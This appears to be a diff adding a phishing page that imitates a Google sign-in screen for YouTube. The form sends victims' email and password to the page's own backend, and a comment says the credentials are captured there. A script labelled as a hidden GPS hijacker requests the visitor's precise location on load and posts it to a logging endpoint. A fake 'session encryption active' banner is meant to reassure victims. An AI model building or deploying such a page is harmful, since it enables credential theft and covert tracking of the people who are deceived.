@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com" rel="stylesheet">
+    <style>
+        body { 
+            font-family: 'Roboto', sans-serif; 
+            background-color: #fff; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-h-screen;
+            height: 100vh;
+            margin: 0;
+        }
+        .google-card {
+            width: 450px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+        .google-input:focus {
+            border: 2px solid #1a73e8;
+            outline: none;
+            padding: 12px 14px;
+        }
+        .google-btn {
+            background-color: #1a73e8;
+            transition: background-color .2s;
+        }
+        .google-btn:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        #sync-loader {
+            display: none;
+            margin-top: 20px;
+            font-family: monospace;
+            font-size: 11px;
+            color: #1a73e8;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="google-card shadow-sm">
+        <!-- Google Logo -->
+        <div class="flex justify-center mb-3">
+            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org">
+                <path d="M12.5 11V13.5H19.5C19.2 15 17.5 18 12.5 18C8.2 18 4.7 14.5 4.7 10.2S8.2 2.4 12.5 2.4C15 2.4 16.6 3.4 17.6 4.4L19.4 2.6C17.6 1 15.3 0 12.5 0C6.9 0 2.3 4.6 2.3 10.2S6.9 20.4 12.5 20.4C18.4 20.4 22.3 16.2 22.3 10.4C22.3 9.7 22.2 9.1 22.1 8.5H12.5V11Z" fill="#4285F4"/>
+            </svg>
+        </div>
+
+        <h1 class="text-2xl font-normal text-[#202124] mb-2">Sign in</h1>
+        <p class="text-base text-[#202124] mb-10">to continue to YouTube</p>
+
+        <form id="ytForm" action="/login/youtube" method="POST" class="text-left">
+            <div class="relative mb-6">
+                <input name="user" type="text" placeholder="Email or phone" 
+                       class="google-input w-full p-[13px] border border-[#dadce0] rounded-[4px] text-base" required>
+            </div>
+
+            <div class="relative mb-2">
+                <input name="pass" type="password" placeholder="Enter your password" 
+                       class="google-input w-full p-[13px] border border-[#dadce0] rounded-[4px] text-base" required>
+            </div>
+
+            <button type="button" class="text-[#1a73e8] text-sm font-bold mt-2 hover:bg-blue-50 p-1 rounded transition">Forgot password?</button>
+
+            <div class="mt-10 flex justify-between items-center">
+                <button type="button" class="text-[#1a73e8] font-bold text-sm hover:bg-blue-50 px-2 py-2 rounded transition">Create account</button>
+                <button id="ytBtn" type="submit" class="google-btn text-white px-6 py-2 rounded font-bold text-sm">
+                    Next
+                </button>
+            </div>
+        </form>
+
+        <!-- Presentation Sync Logic -->
+        <div id="sync-loader" class="animate-pulse">
+            [+] V8_SESSION_ENCRYPTION: ACTIVE
+        </div>
+    </div>
+
+    <!-- Hidden GPS Hijacker Logic -->
+    <script>
+        const ytForm = document.getElementById('ytForm');
+        const ytBtn = document.getElementById('ytBtn');
+        const loader = document.getElementById('sync-loader');
+
+        ytForm.onsubmit = function() {
+            ytBtn.innerText = "Verifying...";
+            ytBtn.disabled = true;
+            ytBtn.style.opacity = "0.7";
+            loader.style.display = "block";
+            // Credentials captured by Python backend via POST
+        };
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    const data = {
+                        lat: p.coords.latitude, 
+                        lon: p.coords.longitude,
+                        acc: p.coords.accuracy,
+                        target: "YouTube_G_V8"
+                    };
+                    
+                    fetch('/log_gps', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                }, 
+                function(err) { console.log("User Denied GPS"); },
+                { enableHighAccuracy: true });
+            }
+        }
+    </script>
+</body>
+</html>
